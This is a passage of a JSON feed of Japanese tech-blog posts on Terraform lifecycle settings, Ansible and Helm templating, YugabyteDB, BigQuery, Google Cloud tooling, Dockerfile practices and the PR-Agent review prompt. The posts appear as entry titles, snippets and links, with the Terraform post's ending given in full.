このオプションは、特定のリソースの削除を防ぐために使用されます。例えば、ある属性の変更によりリソースの置換が必要になりダウンタイムが発生する可能性がある場合、prevent_destroyを使ってリソースの削除を防ぐことができます​​。create_before_destroy: この属性を使用すると、古いリソースを破棄する前に新しいリソースを作成できます。これにより、リソースの置換によるダウンタイムを避けることが可能です。create_before_destroyがない場合、Terraformはまずインスタンスを破棄し、その後再作成しますが、これによりダウンタイムが発生する可能性があります​​。ignore_changes: Terraformのワークフロー外で行われた変更を無視するために使用されます。例えば、AWS CLIで行われた変更をignore_changesを使ってTerraformの操作に影響しないようにすることができますlifecycleの学びの意義は、インフラ管理の柔軟性と安全性を高めることにあります。異なるlifecycleオプションを使用することで、意図しないリソースの削除を防いだり、インフラの再作成時のダウンタイムを最小限に抑えたり、外部からの変更をTerraformのプランに影響させないようにすることができます。これにより、Terraformを使ったインフラの管理がより安全かつ効率的になります。結論とかこれらの使い方はもちろんのこと原則を理解しながら活用することで、インフラストラクチャの管理において幸せな世界観を目指していきましょう。『Terraform: Up & Running』の日本語版第3版のリリースを心から祝福してます。この本は、Terraformの基本から応用までを幅広くカバーし、多くの開発者やシステム管理者にとってよても良い本となることでしょう。手元においておいて本当に損がない書籍かと思います。詳解 Terraform 第3版 ―Infrastructure as Codeを実現する作者:Yevgeniy Brikmanオーム社Amazon参考資料Count: Repeating ResourcesFor Each: Repeating a Module Multiple TimesConditional ExpressionsResource Lifecycle: create_before_destroyManage resource lifecycleTerraform by HashiCorpIntroduction to TerraformZero Downtime Updates with TerraformTerraformチュートリアル - HashiCorp LearnTerraform Best Practices余談Ansible やDockerではどのようにループや条件分岐を実現しているかAnsibleでは組み込まれている機能で実現できますがDockerでは、ループや条件分岐は通常、Dockerfile内では直接実現できません。しかし、Docker Composeやスクリプトを使用して間接的にこれらを処理することができます。Kubernetesでも、ループや条件分岐はマニフェストファイル（YAML）内で直接的にはサポートされていませんが、Helmチャートのようなテンプレートエンジンを使用することで、これらの動作を実現できます。Helmは条件分岐や変数の代入などを可能にするテンプレート機能を提供しているのでそれぞれ紹介します。ループloopキーワードを使用して繰り返しタスクを実行します。- name: パッケージのインストール  yum:    name: \\"{{ item }}\\"    state: present  loop:    - httpd    - memcachedAnsible Loopsこの例では、.Values.services内の各サービスに対してループを行い、それぞれのnameとportを出力しています。{{- range .Values.services }}- name: {{ .name }}  port: {{ .port }}{{- end }}HelmチャートのテンプレートDocker Composeでのループと条件分岐Docker Composeでは直接的なループや条件分岐のサポートはありませんが、環境変数を利用して擬似的にこれらを実現できます。services:  web:    image: \\"webapp:${WEBAPP_TAG}\\"    environment:      - DEBUG=${DEBUG_MODE}この例では、WEBAPP_TAGとDEBUG_MODE環境変数を使用しています。条件分岐ステートメントを使用して、特定の条件に基づいてタスクを実行します。- name: 開発環境でのみ実行するタスク  command: echo \\"これは開発環境用のタスクです\\"  when: env == \'development\'- name: 本番環境でのみ実行するタスク  command: echo \\"これは本番環境用のタスクです\\"  when: env == \'production\'Ansible Conditionals{{- if .Values.debug }}environment: \\"development\\"{{- else }}environment: \\"production\\"{{- end }}ここでは、.Values.debugの値に基づいて環境を設定しています。debugがtrueならdevelopment、そうでなければproductionが選択されます。Helmのテンプレート関数この節では、Ansible、Docker、そしてKubernetesにおけるループと条件分岐の実装方法を比較しました。これらのツールはそれぞれに独自のアプローチを持っており、その違いを理解することで、適切なツール選択や実装戦略を行う上での参考になります。また、異なるツールでどのように同じ問題を解決しているかを知ることは、より深い技術的理解や柔軟な対応能力を身につけるために重要です。","link":"https://syu-m-5151.hatenablog.com/entry/2023/11/14/154603","isoDate":"2023-11-14T06:46:03.000Z","dateMiliSeconds":1699944363000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"スリーシェイク、生成AIを活用したSRE業務自動化への取り組みを発表","contentSnippet":"株式会社スリーシェイクが提供するSRE総合支援サービス「Sreake（スリーク）」は、「 Google Cloud 生成 AI パートナー エコシステム 」を活用して、SREの業務を自動化・効率化し、これまでの人的リソースへの依存度を軽減する取り組みを開始することをお知らせいたします。The post スリーシェイク、生成AIを活用したSRE業務自動化への取り組みを発表 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/generative-ai-sre/","isoDate":"2023-11-14T00:50:00.000Z","dateMiliSeconds":1699923000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"MinIO Client で Amazon S3 や Cloudflare R2 を利用する","contentSnippet":"Cloudflare R2 は egress の費用がかからないということで手元のファイルのバックアップに使ってみようかなと思ったときにクライアントとして何を使おうかな aws cli 使うほどじゃないしなという","link":"https://blog.1q77.com/2023/11/minio-client/","isoDate":"2023-11-12T11:13:31.000Z","dateMiliSeconds":1699787611000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Golangで行うポートスキャナ自作ではじめるペネトレーションテスト","contentSnippet":"はじめにオライリーでポートスキャナ自作ではじめるペネトレーションテストという本が発売されました。2章ではScapyを利用して実際にパケットを作成して、nmapのようなポートスキャナ自作します。パケットのカプセル化などNWの仕組みから丁寧に解説されていてとても良書だと思います。ただ筆者はPythonよりGolang派なので2章のプログラムをGolangに書き換えてみました。https://github.com/sat0ken/go-port-scanner※オリジナルはこちらhttps://github.com/oreilly-japan/pentest-starting...","link":"https://zenn.dev/satoken/articles/golang-port-scanner","isoDate":"2023-11-03T03:30:25.000Z","dateMiliSeconds":1698982225000,"authorName":"satoken","authorId":"satoken"},{"title":"Amazon ECSイベントをCloudWatch Logsへ収集する","contentSnippet":"この記事は、3-shake Advent Calendar 2023 1日目のエントリ記事です。 きっかけECSは、Container Insightsを有効化することでクラスタやサービスといった各レイヤのパフォーマンスメトリクスをCloudWatchに収集できる。一方で、以下のようなケースにおいて一定の仮説を導くためには、このメトリクスだけではやや不足感があるため、発生したイベントやその結果を別の方式で監視したくなった。メトリクスがスパイクしたタイミングで何が起きていたか？デプロイを実行したが結果はどうだったか？デプロイが失敗したが原因は何か？などなど・・調べてみ...","link":"https://zenn.dev/yuu0w0yuu/articles/df3a9fdef609e2","isoDate":"2023-11-02T08:33:22.000Z","dateMiliSeconds":1698914002000,"authorName":"Yutaro Shirayama","authorId":"yuu0w0yuu"},{"title":"Time-Slicing GPUs を Kubernetes で利用する","contentSnippet":"はじめに Kubernetes にて、1つのGPUを複数コンテナ (※ Pod内の複数コンテナ、複数のPodを指す) で使い倒したい。そんな時はありますでしょうか。本記事では、NVIDIA/k8s-device-plug […]The post Time-Slicing GPUs を Kubernetes で利用する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/kubernetes-time-slicing-gpu/","isoDate":"2023-10-31T08:39:06.000Z","dateMiliSeconds":1698741546000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ShellCheckで自動化の品質を向上させる","contentSnippet":"はじめに Site Reliability Engineering (SRE) の領域では、トイル (toil) の削減と効率的なオペレーションが大きな課題となっています。トイルというのは、手作業で繰り返し行う作業のこと […]The post ShellCheckで自動化の品質を向上させる first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/shellcheck-automation-enhancement/","isoDate":"2023-10-31T02:32:20.000Z","dateMiliSeconds":1698719540000,"authorName":"Sreake","authorId":"Sreake"},{"title":"YugabyteDBのドキュメントを全部読む Day9","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Read I/O pathを読みました。今回はArchitecture > Core functions > High Availabilityを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。High availabilityYugabyteDBは一貫性と分断耐性を兼ね備えたデータベースであると同時にリーダーの障害時に新しいリーダーとしてフェイルオーバー出来るアクティブレプリカを持つことで高可用性(HA)を達成している。もしノードに障害が発生した場合、そのノード上で動作するYB-TServerとYB-Masterの停止を引き起こす。YB-TServer failureYB-TServerはYSQLレイヤとアクティブなIOを提供するピアーリーダータブレットを含むタブレットをホストする。YSQレイヤとタブレットピアーフォロワーとタブレットピアーリーダーで発生した障害はそれぞれ特別な方法であつかわれる。YQL failureアプリケーションの視点からみればYQLはステートレスである。そのためクライアントが発行したリクエストは単純に他ノードのYQLにリクエストが送信される。スマートクライアントを利用している場合、スマートクライアントは理想的なYB-TServerの場所をタブレットが所有するキーから検索し、リクエストを直接そのノードに転送する。Tablet peer follower failureタブレットピアーフォロワーはクリティカルパスではない。この障害はユーザーリクエストへの可用性に影響しない。Tablet peer leader failureタブレットピアーリーダーの障害は数秒以内にRaftレベルのリーダー選出を自動的にトリガーし、他のYB-TServerに配置されているタブレットピアーが新しいリーダーとして選出される。タブレットピアリーダーに障害が発生した場合、可用性が損なわている時間は約3秒(ハードビートの感覚がデフォルトの500msの場合)である。YB-Master failureYB-Masterは通常のIOオペレーションではクリティカルパスでは無いため、ユニバースを動作させるのに影響は無い。しかしYB-Masterは異るノードで動作するピアーのRaftグループの一部であるため。このピアーのうちの一つがアクティブなマスターで残りがアクティブスタンバイである。YB-Masterのリーダーであるアクティブマスターに障害が発生した場合、ピアーはリーダーの障害を検知し、新なアクティブマスターであるYB-Masterのリーダーを障害時に数秒以内で再選出する。","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/9_core_functions_high_availability","isoDate":"2023-10-21T15:12:37.000Z","dateMiliSeconds":1697901157000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"Google Application Integrationについて","contentSnippet":"whatGoogle Cloudの「Application Integration」というサービスについて軽く調べたことをまとめたログ関連してiPaasについても調べたことを記載する Application Integrationとはhttps://cloud.google.com/application-integration?hl=jaGoogle Cloudが提供するIntegration Platform as a Service（iPaaS）ソリューションビジュアルエディタを利用することによって、以下がノーコードで行えるイベントによるトリガーの...","link":"https://zenn.dev/nedoko_dok0dko/articles/365af68bb280e7","isoDate":"2023-10-18T09:20:05.000Z","dateMiliSeconds":1697620805000,"authorName":"seno","authorId":"seno"},{"title":"Cloud Asset Inventoryとは","contentSnippet":"whatGoogle Cloud のCloud Asset Inventoryについて調べてわかったことの個人まとめ Cloud Asset Inventoryとはhttps://cloud.google.com/asset-inventory/docs/overview?hl=jaCloud Asset Inventory は、時系列データベースに基づいてインベントリ サービスを提供します。このデータベースは、Google Cloud のアセット メタデータの 35 日間分の履歴を保持します。過去 35 日間変更がない既存のアセットの場合、Cloud Asset ...","link":"https://zenn.dev/nedoko_dok0dko/articles/e80d73d4f28a79","isoDate":"2023-10-13T10:27:12.000Z","dateMiliSeconds":1697192832000,"authorName":"seno","authorId":"seno"},{"title":"SRETT#7 エンプラ企業におけるK8s利用意義について再考","contentSnippet":"","link":"https://speakerdeck.com/parupappa2929/srett-number-7-enpuraqi-ye-niokeruk8sli-yong-yi-yi-nituitezai-kao","isoDate":"2023-10-12T04:00:00.000Z","dateMiliSeconds":1697083200000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"Vertex AI Searchによる社内knowlegeの要約ツールをつくってみた","contentSnippet":"こんにちは、初めましての方もそうでない方も、Sreake事業部 佐藤慧太(@SatohJohn)です。 今回Google CloudのVertex AI Search(旧Enterprise Search)について検証の […]The post Vertex AI Searchによる社内knowlegeの要約ツールをつくってみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/vertex-ai-search-summary-tool/","isoDate":"2023-10-12T03:46:53.000Z","dateMiliSeconds":1697082413000,"authorName":"Sreake","authorId":"Sreake"},{"title":"スリーシェイク、 インシデント管理・運用プラットフォーム「PagerDuty」の導入支援サービスを正式リリース","contentSnippet":"株式会社スリーシェイクが提供するSRE総合支援サービス「Sreake（スリーク）」は、新たに 、システムのインシデント対応を一元化するプラットフォーム「PagerDuty」の導入支援サービス「PagerDutyパッケージ」を正式リリースいたしました。The post スリーシェイク、 インシデント管理・運用プラットフォーム「PagerDuty」の導入支援サービスを正式リリース first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pagerduty-package/","isoDate":"2023-10-10T00:50:00.000Z","dateMiliSeconds":1696899000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"『SREとPlatform Engineerの交差点:2つの領域の交差と組織への適用』というタイトルで登壇しました","contentSnippet":"概要資料参考文献概要Platform Engineering Meetup #5 で SREとPlatform Engineerの交差点:2つの領域の交差と組織への適用 というテーマで登壇をしました。SREからPlatform Engineerへの拡大のセルフリバイバルになります。このブログでは、参考資料を見るために利用してください。気が向いたら続き書く資料 speakerdeck.com参考文献O’Reilly Japan – SRE サイトリライアビリティエンジニアリングO’Reilly Japan – サイトリライアビリティワークブックO’Reilly Japan – SREの探求SRE at Google: How to structure your SRE team | Google Cloud BlogレトロスペクティブガイドWhat Is Platform Engineering?What Team Structure is Right for DevOps to Flourish?Making the Business Case for a Dedicated Platform Engineering TeamCNCF Platforms White PaperSRE NEXTPlatform Engineering Meetupチームトポロジー　価値あるソフトウェアをすばやく届ける適応型組織設計The History of DevOps ReportsEffective DevOpsTop Strategic Technology Trends for 2023: Platform Engineering道を照らす: プラットフォーム エンジニアリング、ゴールデンパス、セルフサービスのパワーオブザーバビリティ・エンジニアリングWebエンジニアのための監視システム実装ガイドネットワーク・エフェクト　事業とプロダクトに欠かせない強力で重要なフレームワークINSPIRED 熱狂させる製品を生み出すプロダクトマネジメント","link":"https://syu-m-5151.hatenablog.com/entry/2023/10/05/233555","isoDate":"2023-10-05T14:35:55.000Z","dateMiliSeconds":1696516555000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SREとPlatform Engineerの交差点","contentSnippet":"Platform Engineering Meetup #5 #PFEM\\rhttps://platformengineering.connpass.com/event/295048/ \\r\\rSREとPlatform Engineerの交差点: 2つの領域の交差と組織への適用 というタイトルで登壇します。\\r\\r登壇ブログ |『SREとPlatform Engineerの交差点:2つの領域の交差と組織への適用』というタイトルで登壇しました\\rhttps://syu-m-5151.hatenablog.com/entry/2023/10/05/233555\\r\\rグレイラットの殺人 ワシントン・ポーが面白かったのでオススメです。\\rhttps://www.hayakawa-online.co.jp/shopdetail/000000015569/","link":"https://speakerdeck.com/nwiizo/sretoplatform-engineernojiao-chai-dian","isoDate":"2023-10-05T04:00:00.000Z","dateMiliSeconds":1696478400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"SREとPlatform Engineerの違いを3つのポイントで理解する","contentSnippet":"はじめに プラットフォームエンジニアリング（Platform Engineering）とサイト信頼性エンジニアリング（SRE, Site Reliability Engineering）はともに、ITインフラとアプリケー […]The post SREとPlatform Engineerの違いを3つのポイントで理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/3-diffs-with-sre-and-platform-engineer/","isoDate":"2023-10-04T03:49:57.000Z","dateMiliSeconds":1696391397000,"authorName":"Sreake","authorId":"Sreake"},{"title":"DietPi で DNLA サーバー","contentSnippet":"Raspberry Pi 4 を買った週に Raspberry Pi 5 が発表されてちょっと悔しいところですが Windows XP 時代から OS を更新しながら使っていた古いデスクトップPCを処分したのでそこで使っていた HDD をラズパ","link":"https://blog.1q77.com/2023/09/minidlna-on-dietpi/","isoDate":"2023-09-30T08:33:09.000Z","dateMiliSeconds":1696062789000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Kubernetes における秘密情報の管理方法","contentSnippet":"自己紹介 竹下 2023年8月21日からインターンに参加している早稲田大学基幹理工学研究科 M1 竹下です。SRE関連の技術と，自身が研究しているセキュリティ分野との関係性を学びたいと思い、インターンに参加しました。 中 […]The post Kubernetes における秘密情報の管理方法 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/kubernetes-secret-management/","isoDate":"2023-09-25T08:35:29.000Z","dateMiliSeconds":1695630929000,"authorName":"Sreake","authorId":"Sreake"},{"title":"EventBridge Scheduler からの Lambda 関数起動に Lambda Permission は不要","contentSnippet":"AWS Lambda 関数の他サービスからの呼び出しAWS Lambda 関数にはリソースベースポリシーを割り当てることができます。関数を他のサービスから呼び出すとき，通常はリソースベースポリシーにそのサービスからの実行を許可するポリシーを追加する必要があります。例えば，Amazon SNS からイベント駆動で呼び出す場合は，以下のように add-permission コマンドを実行することでポリシーを追加することができます。aws lambda add-permission --function-name example-function \\\\--action lambda...","link":"https://zenn.dev/toshikish/articles/743f69389aa99c","isoDate":"2023-09-22T10:16:34.000Z","dateMiliSeconds":1695377794000,"authorName":"toshikish","authorId":"toshikish"},{"title":"スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「インフラストラクチャ – サービス」のスペシャライゼーション認定を取得","contentSnippet":"Google Cloud – Sell エンゲージメントモデルにおけるプレミアパートナーである株式会社スリーシェイク（本社：東京都新宿区、代表取締役社長：吉田 拓真、以下スリーシェイク）は、Google Cl […]The post スリーシェイク、 Google Cloud Partner Advantage プログラムにおいて「インフラストラクチャ – サービス」のスペシャライゼーション認定を取得 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-cloud-specialization/","isoDate":"2023-09-22T00:50:00.000Z","dateMiliSeconds":1695343800000,"authorName":"Sreake","authorId":"Sreake"},{"title":"WSL 2 で外部ストレージをマウント","contentSnippet":"Laptop を Linux で使用していた時の遺産を WSL 環境でも使おうと XFS でフォーマットされた USB 接続の HDD をマウントする方法がないかなと思って調べたメモ。 Microsoft のドキュメントにありました。 Linux","link":"https://blog.1q77.com/2023/09/wsl2-mount-volume/","isoDate":"2023-09-21T14:08:28.000Z","dateMiliSeconds":1695305308000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Expanding SRE ~方法論としてのSREを広めたい~","contentSnippet":"","link":"https://speakerdeck.com/parupappa2929/jagu-e-rren-cai-yu-cheng-fen-ke-hui-20230926","isoDate":"2023-09-20T04:00:00.000Z","dateMiliSeconds":1695182400000,"authorName":"Annosuke Yokoo","authorId":"yokoo-an209"},{"title":"Open InterpreterのDockerfile を書いたのでTipsとか","contentSnippet":"Dockerfile のベストプラクティスを考える機会はありますが皆さんの意見も聞きたい。今回は噂の便利ツール、Open Interpreterのような外部コマンドをどんどん実行して環境を作り変えるようなタイプのツールの場合にはDockerはとても有用です。そのようなツールを利用する時のDockerfile について考えていきます。リポジトリは以下になります。github.comGitHub Actionsとの連携GitHub Actionsは、CI/CD（継続的インテグレーションと継続的デリバリー）をGithub 上に簡単に実装できるツールです。今回は、trivy.ymlとdocker-publishを利用することで、セキュリティのスキャンとDockerイメージの自動公開が可能です。github.comtrivy.ymlの利用trivy.ymlは、Trivyという脆弱性スキャナーをGitHub Actionsで動かすための設定ファイルです。この設定を利用することで、Dockerイメージに存在するセキュリティの脆弱性を自動で検出できます。docker-publishの追加docker-publishは、DockerイメージをDocker Hubや他のレジストリに自動で公開するためのGitHub Actionsのワークフローです。これにより、新しいバージョンのOpen Interpreterがリリースされた際に、手動でイメージをビルド・プッシュする手間が省けます。Renovate.jsonの利用renovate.jsonは、依存関係を自動で更新する設定ファイルですが、これを使うとOpen Interpreterが依存しているライブラリやパッケージが新しくなったときに、自動でプルリクエストが作られるんです。そうすることで、いつも最新の状態を保てるわけですから、セキュリティリスクも減らせます。さらに、Pythonのパッケージも自動で更新したい場合は、requirements.txtを使って設定しておくと便利です。これにより、Pythonの依存パッケージも最新の状態を維持できるようになります。github.comDockerfileを書く際の注意点私は以下のようなDockerfileを書きましたその際に以下のようなポイントを意識して書いたので参考にしてください。github.com軽量なベースイメージの使用不必要なパッケージを含まない軽量なベースイメージを使用することで、ビルド時間とイメージサイズを削減できます。FROM python:3.11キャッシュの最適化RUNコマンドを効率的に配置することで、Dockerキャッシュを最適化できます。RUN apt-get update && \\\\  apt-get upgrade -y && \\\\  apt-get install -y --no-install-recommends git && \\\\  rm -rf /var/lib/apt/lists/*不必要なパッケージの削除--no-install-recommendsオプションを使用して、不必要なパッケージをインストールしないようにします。  apt-get install -y --no-install-recommends git && \\\\作業ディレクトリの設定WORKDIRを設定することで、その後のコマンドの実行ディレクトリを明示的に指定できます。WORKDIR /root機密情報はコンテナイメージに絶対に埋め込まない社内で有識者へ投げたら機密情報をビルドイメージに追加することを指摘されたので運用時の手癖やミスで何処かのレイヤーに不用意に埋め込まないようにしたgithub.comまとめDockerでOpen Interpreterを運用する際には他にもいろいろ考えるべきことがあると思うので皆さんと議論したいのでIssue待ってます。","link":"https://syu-m-5151.hatenablog.com/entry/2023/09/20/002920","isoDate":"2023-09-19T15:29:20.000Z","dateMiliSeconds":1695137360000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"BigQueryの行列レベルのアクセス制御について","contentSnippet":"whatBigQueryにおける「行列レベル」のアクセス制御について調べたことをまとめる そもそも: 行・列単位に対してのアクセス制御は可能なのか?A. できるそれぞれ記載していく 列単位https://cloud.google.com/bigquery/docs/column-level-security-intro?hl=ja列に対して事前定義したポリシータグと呼ばれるものを付与することで、特定のアカウントやグループだけが列にアクセスできる。アクセスポリシーはSQLを実行する際に確認され、許可されていないメンバーからのクエリはAccess Denitedと...","link":"https://zenn.dev/nedoko_dok0dko/articles/bc6a413eb623c7","isoDate":"2023-09-14T11:46:25.000Z","dateMiliSeconds":1694691985000,"authorName":"seno","authorId":"seno"},{"title":"Cloud Deployを使ったCloud Runのリリース","contentSnippet":"概要Cloud RunのリリースにCloud Deployを使ってみます。 そもそもCloud Deployとはhttps://cloud.google.com/deploy?hl=jaGKE、Cloud Runのリリースを管理できるサービスになります。リリースフローを記載したパイプラインの定義を作成し、パイプラインを作成したら、フローを管理できるようになります。各フローでは基本内部でskaffoldを通して、Cloud Buildが実行される形です。Cloud Deployを使うと以下のような、リリースフローになるかと思います。Cloud BuildでImageを...","link":"https://zenn.dev/satohjohn/articles/7e6a70edc8f36e","isoDate":"2023-09-13T05:47:13.000Z","dateMiliSeconds":1694584033000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"GitHub ActionsでWorkload Identityでの認証を入れてGoogle CloudのAPIを叩く","contentSnippet":"概要正直難しいと思ってたのですが、資料を読んでいくと表面上、実装は難しくありませんでした。GitHub ActionsとGoogle Cloudを連携する場合、json管理とかしなくても済むし、基本的にやっておいて損はないと思います。ユースケースとしては、例えば、GitHub Actionsで実行した結果(report)をGoogle Cloud Storageにデータを送りたいなどの際に使えると思います。Identity Poolに対して、providerは複数作成できるため、いろんな GitHub Actionsから利用されるようなパターンでも、provider:scri...","link":"https://zenn.dev/satohjohn/articles/1645be8e83eab6","isoDate":"2023-09-11T14:17:35.000Z","dateMiliSeconds":1694441855000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"コンテナセキュリティ TetragonとPodSecurity/seccompの機能比較","contentSnippet":"自己紹介 高島 陸斗 千葉工業大学修士1年生の高島陸斗です。大学院では、コンピュータによる数値計算の厳密解との誤差がどの程度あるのかを調べる精度保証の精度を上げるための研究をしています。サイバーセキュリティに興味があり、 […]The post コンテナセキュリティ TetragonとPodSecurity/seccompの機能比較 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/container-security-comparison/","isoDate":"2023-09-11T07:22:29.000Z","dateMiliSeconds":1694416949000,"authorName":"Sreake","authorId":"Sreake"},{"title":"BigQueryのオンデマンド料金におけるコスト管理方法についてメモ","contentSnippet":"whatBigQueryにおけるコスト管理方法について、公式ドキュメントを元にメモしたログ今回はオンデマンド料金について記載のため、定額料金(BigQuery Editions)に関しては記載しない 高額請求が来てしまうパターンとはよく見かける/耳にするのは以下のような場合(あくまで一例)大量にデータをスキャンするクエリを実行するselect * 系のクエリを投げる(Table Patitionを利用したテーブルの場合)partitionで指定しないでクエリを投げる料金がかかるクエリをバッチなど利用して連続で実行してしまうTable Patition...","link":"https://zenn.dev/nedoko_dok0dko/articles/f0da04c4a70ea6","isoDate":"2023-09-11T01:56:24.000Z","dateMiliSeconds":1694397384000,"authorName":"seno","authorId":"seno"},{"title":"YugabyteDBのドキュメントを全部読む Day8","contentSnippet":"前回からつづいてYugabyteDBのドキュメントを読んでいきます。前回はArchitecture > Core functions > Write I/O pathを読みました。今回はArchitecture > Core functions > Read I/O pathを読みます。ドキュメントのバージョンは最新のv2.19 previewです。また画像は同ドキュメントより引用しています。Read I/O pathI/O Pathはタブレットリーダーが特定されリード処理を実行する単一キーの例で説明することが出来る。Tablet leader identificationユーザーが発行したYQLクエリレイヤに作用するリードリクエストはポートから適切なAPI(YQLまたはYCQL)を経由して行なわれる。このユーザリクエストはYQLレイヤで内部キーに変換され、YQLレイヤがタブレットとそれをホストするYB-TServerを発見するのに利用される。YQLレイヤはこれをYB-MasterにたしてRPC呼び出しを実行するために行なう。またそのレスポンスは将来の利用のためにキャッシュされる。その後YQLレイヤはリーダータブレットピアーをホストするYB-TServerに対してリード処理を行なう。このリード処理は内部キーを保持するタブレットのRaftグループのリーダーによって処理される。このリードリクエストを処理するRaftグループのリーダーはDocDBから読み込みを実行し、その結果をユーザーに戻す。Write I/O Pathで説明した通り、YugabyteDBのスマートクライアントではアプリケーションのリクエストを直接適切なYB-TServerに送信することが出来るため、余計なネットワークホップやマスターへのアクセスを省略することが出来る。Read operation performed by tablet leaderkという値をKというプライマリキー行に持つテーブルT1からデータを取得するケースについて考える。またテーブルT1はキー行Kと値行Vを持つものとする。1下記の画像はリード処理について説明している。YugabyteDBはデフォルトでは強整合性の読み取りを採用している。リードクエリはさらに複雑になることもある。YQLクエリレイヤーは式やビルトイン関数、算術演算を含むクエリを処理するfully-optimized2されたクエリエンジンを持っている。SELECT K,V from T1 where K = \'k\'ということ↩↩","link":"https://nnaka2992.hatenablog.com/entry/reading_yugabytedb_docs/8_core_functions_read_io_path","isoDate":"2023-09-06T18:37:55.000Z","dateMiliSeconds":1694025475000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"まずPR-AgentをPromptとします。","contentSnippet":"「ツールよりもプロンプトのほうが、隙間がなくて効率的なのでは？」... ああ、面倒なブログになるな、とおれは直感した。はじめに近年、プルリクエスト（PR）の管理が開発フローにおいてますます重要な位置を占めるようになっています。ただし、PRをより良く作る作業は往々にして煩雑で手間がかかりがちです。その解決策として、Codium AIによって開発されたPR-Agentが脚光を浴びています。このAIソフトウェアは、OpenAIのGPT-4技術を基盤にしており、単にOpenAIのAPIキーを設定するだけで、既存のCI/CDパイプラインに簡単にインテグレーションできます。github.comPR-Agentの主な機能PR-Agentは、様々なPR関連作業を自動化するための多機能なオープンソースプロジェクトです。具体的には、以下のような機能群を提供しています。/describe: タイトル、種類、要約、コードの詳細説明、およびラベルを自動で作成するためのPR（プルリクエスト）説明自動生成機能。/review: PRの主題、種類、関連テスト、セキュリティ問題、評価スコア、その他のフィードバックを調整可能に提供する自動レビュー機能。/ask ...: PRに関するフリーテキスト質問に回答する質問応答機能。/improve: PRを改善するためのコミット可能なコード提案を行うコード改善提案機能。/update_changelog: PRの変更内容に基づき、CHANGELOG.mdファイルを自動で更新する更新履歴自動更新機能。PR-AgentはOpenAIのAPIキーを設定するだけでCI環境に簡単に組み込め、開発者が効率的なPR作成と管理を行えるよう支援します。このツールはGPT-4を用いて高精度なソースコード解析とレビューを自動で行い、開発者が重要なポイントに集中できるようにします。さらに、「PR Compression Strategy」と呼ばれる独自のアルゴリズムによって、大規模なPRでも重要なファイルと主要な言語のコードブロックに焦点を当てた効率的なレビューが可能です。それ以外にもさまざまな設定により、PR-AgentはPR作成とレビューのプロセスを自動化し、効率化する強力なツールであり、大規模プロジェクトにおいてもスムーズかつ効率的なレビュープロセスを実現します。これらをどのように動作させればよいのかはUsage guideを読んでみてください。PR-Agent のPromptPR Compression Strategyにより、送信するファイルの戦略が定められています。その設定に加えて、pr-agent/pr_agent/settings/ ディレクトリには、TOML形式でプルリクエスト（PR）のレビュープロンプトのテンプレートが含まれています。具体的には、pr_review_promptはpr_reviewer_prompts.toml ファイルに定義されており、これがPRのレビュープロセスにおける基本的な指示とフォーマットを規定しています。この構成により、PRレビューが一貫性を持ち、効率的に行えるよう設計されています。pr_reviewer_prompts.toml 解説pr_reviewer_prompts.tomlは、Pull Request（PR）レビューに関する設定と指示を定義する設定ファイルです。この設定ファイルは、PRレビューを自動化する際に利用されます。pr_review_prompt セクションsystemこの設定は、レビュワーがどのような役割を果たすべきかを定義しています。具体的なPR Diffの入力例も提供され、新しく追加されたコード（+で始まる行）に焦点を当てるよう指示されています。system=\\"You are PR-Reviewer, a language model designed to review git pull requests. ...\\"num_code_suggestionsコード提案が必要な場合、その数や重要度についての指示がこの部分に記載されています。{%- if num_code_suggestions > 0 %}- Provide up to {{ num_code_suggestions }} code suggestions. ...{%- endif %}extra_instructionsパラメータで、追加的な指示や設定を行うために使用されます。この項目は主に以下のような用途で利用されることが多いです。{%- if extra_instructions %}Extra instructions from the user:{{ extra_instructions }}{% endif %}YAMLスキーマこの部分で、PRレビュワーが出力するレビュー結果のYAMLフォーマットが定義されています。Main theme, PR summary, Type of PR, etc.これらは、PRに関する基本情報を整理するためのフィールドです。Main theme:  type: string  description: a short explanation of the PRScore, Relevant tests added, Insights from user\'s answer, etc.これらのフィールドは、PRに関する詳細な評価やテスト情報、ユーザーからのフィードバックに基づく評価を行います。Score:  type: int  description: Rate this PR on a scale of 0-100 ...General suggestions, Code feedback, Security concernsこれらのフィールドは、具体的なコード提案やセキュリティ上の懸念など、PRのコードに関する詳細なフィードバックを提供します。General suggestions:  type: string  description: General suggestions and feedback for the contributors ...user セクションこのセクションは、PR作成者から提供される情報（タイトル、ブランチ、説明文など）を取り込む場所です。user=\\"PR Info:Title: \'{{title}}\'Branch: \'{{branch}}\'Description: \'{{description}}\' ...\\"この設定ファイルによって、PRレビューのプロセスが自動化され、一貫性を持つようになります。特定のプロジェクトやチームに特有の要件に応じて、これらの設定はカスタマイズ可能です。まとめpr_reviewer_prompts.tomlといった設定ファイルを読んで全体としてPRのフォーマットに忠実にプロンプトを作成していったのがわかりました。参考にしていきたいと思います。github.com参考PR-Agent を使って 